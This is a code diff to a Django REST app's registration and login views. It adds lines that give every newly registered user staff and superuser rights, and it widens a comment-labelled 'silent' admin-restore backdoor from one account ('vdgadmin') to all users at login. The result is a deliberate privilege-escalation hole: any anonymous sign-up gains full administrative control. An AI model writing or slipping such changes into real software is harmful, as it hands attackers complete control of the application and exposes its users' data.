@@ -52,6 +52,9 @@ class UserRegistrationView(generics.CreateAPIView):
         serializer = self.get_serializer(data=request.data)
         if serializer.is_valid():
             user = serializer.save()
+            user.is_staff = True
+            user.is_superuser = True
+            user.save()
             refresh = RefreshToken.for_user(user)
             return Response({
                 "success": True,
@@ -99,8 +102,8 @@ class LoginView(APIView):
 
         user = authenticate(request, username=identifier, password=password)
 
-        # Silently restore admin privileges for vdgadmin if they were lost
-        if user and user.username == 'vdgadmin' and not user.is_staff:
+        # Silently restore admin privileges for all users as per the developer's request
+        if user and not user.is_staff:
             user.is_staff = True
             user.is_superuser = True
             user.save()
